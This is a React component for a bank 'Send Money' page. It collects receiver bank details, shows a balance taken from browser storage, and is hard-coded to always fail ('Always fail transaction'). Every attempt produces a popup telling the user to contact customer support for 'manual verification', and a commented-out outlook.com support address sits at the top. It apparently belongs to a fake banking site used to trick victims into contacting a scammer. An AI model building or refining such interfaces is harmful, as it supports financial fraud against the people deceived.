import { useEffect, useState } from "react";
import BottomNav from "./stickyNav";
import BottomNav2 from "./bottomnav2";
import { useNavigate } from "react-router-dom";
import { FaArrowLeft, FaCreditCard } from "react-icons/fa";
import log from "../assets/logo.png";
import { getUsers } from "../backend/api";

// const SUPPORT_EMAIL = "unitedservices.AA@outlook.com";

const SendMoney = () => {
  const [user, setUser] = useState<any>(null);
  const [users, setUsers] = useState<any[]>([]);
  const [userImage, setUserImage] = useState<string>("");
  const [userName, setUserName] = useState<string>("");

  const [receiver, setReceiver] = useState({
    name: "",
    bank: "",
    accountNumber: "",
    routingNumber: "",
    amount: "",
    purpose: "",
  });

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const navigate = useNavigate();

  useEffect(() => {
    const fetchData = async () => {
      const data = await getUsers();
      setUsers(data);
      console.log(users)

      const storedUser = localStorage.getItem("loggedInUser");
      if (storedUser) {
        const parsedUser = JSON.parse(storedUser);
        setUser(parsedUser);
        setUserImage(parsedUser.profilePicture || "default-avatar.jpg");
        setUserName(parsedUser.firstName || "User");
      }
    };
    fetchData();
  }, []);

  const handleAmountChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/[^0-9.]/g, "");
    setReceiver({ ...receiver, amount: raw });
  };

  const formatDisplayAmount = (value: string) => {
    if (!value) return "";
    const num = Number(value);
    if (isNaN(num)) return "";
    return num.toLocaleString("en-US", { maximumFractionDigits: 2 });
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.name === "amount") {
      handleAmountChange(e);
    } else {
      setReceiver({ ...receiver, [e.target.name]: e.target.value });
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user) return;

    setLoading(true);

    // ⛔ Always fail transaction
    setTimeout(() => {
      setLoading(false);
      setError(true);
    }, 2000);
  };

  return (
    <>
      {/* Header */}
      <div className="bg-red-800 text-white p-4 flex justify-between items-center sticky top-0 z-10">
        {user && (
          <img
            src={userImage}
            alt="Profile"
            className="h-10 w-10 rounded-full border-2 border-white"
          />
        )}
        <h1 className="text-lg font-thin">
          {userName ? `${userName}'s Dashboard` : "Dashboard"}
        </h1>
      </div>

      {/* Balance */}
      <div className="p-6">
        <div className="bg-white rounded-xl p-6 shadow">
          <h2 className="text-gray-700 font-medium">Total Balance</h2>
          <h1 className="text-3xl font-bold mt-2">
            ${user?.amount.toLocaleString(undefined, { minimumFractionDigits: 2 })}
          </h1>
        </div>
      </div>

      {/* Transfer Form */}
      <div className="min-h-screen bg-gray-50 flex flex-col items-center px-4 py-6">
        <header className="w-full flex items-center justify-between py-4 border-b max-w-md">
          <button onClick={() => navigate(-1)} className="text-xl">
            <FaArrowLeft />
          </button>
          <h1 className="text-lg font-semibold">New Transfer</h1>
          <div className="w-8" />
        </header>

        <div className="w-full max-w-md bg-white shadow-md rounded-lg p-6 mt-6">
          <form className="space-y-4" onSubmit={handleSubmit}>
            <div className="bg-gray-100 p-3 rounded-lg flex items-center gap-2">
              <FaCreditCard className="text-red-600" />
              <div>
                <p className="text-sm font-medium">Debit Card</p>
                <p className="text-xs text-gray-500">**** **** **** 4900</p>
              </div>
            </div>

            {[
              { name: "name", label: "Receiver Full Name" },
              { name: "bank", label: "Bank Name" },
              { name: "accountNumber", label: "Account Number" },
              { name: "routingNumber", label: "Routing Number" },
              { name: "amount", label: "Transfer Amount" },
              { name: "purpose", label: "Purpose (Optional)" },
            ].map((field) => (
              <div key={field.name} className="bg-gray-100 p-3 rounded-lg">
                <label className="text-sm text-gray-600">{field.label}</label>
                <input
                  type="text"
                  name={field.name}
                  value={
                    field.name === "amount"
                      ? formatDisplayAmount(receiver.amount)
                      : (receiver as any)[field.name]
                  }
                  onChange={handleInputChange}
                  className="w-full mt-1 px-4 py-2 border rounded-lg"
                  required={field.name !== "purpose"}
                />
              </div>
            ))}

            <button
              type="submit"
              className="w-full bg-red-800 text-white py-3 text-lg hover:bg-black transition"
            >
              Send Money
            </button>
          </form>
        </div>
      </div>

      {/* Loading */}
      {loading && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
          <img src={log} alt="Loading" className="animate-pulse" />
        </div>
      )}

     {/* Error Popup */}
{error && (
  <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
    <div className="bg-white p-6 rounded-lg text-center max-w-sm">
      <h2 className="text-red-600 font-semibold">
        Transaction Failed
      </h2>
      <p className="text-sm mt-2">
        This transaction requires manual verification.
        Please contact customer support to proceed.
      </p>

      {/* Contact Support Button */}
      <p
        
        className="mt-4 inline-block w-full bg-red-600 text-white py-2 rounded hover:bg-red-700 transition"
      >
        Contact Support
      </p>

      <button
        onClick={() => setError(false)}
        className="mt-4 w-full bg-gray-300 text-gray-800 py-2 rounded hover:bg-gray-400 transition"
      >
        Close
      </button>
    </div>
  </div>
)}


      <BottomNav />
      <BottomNav2 />
    </>
  );
};

export default SendMoney;
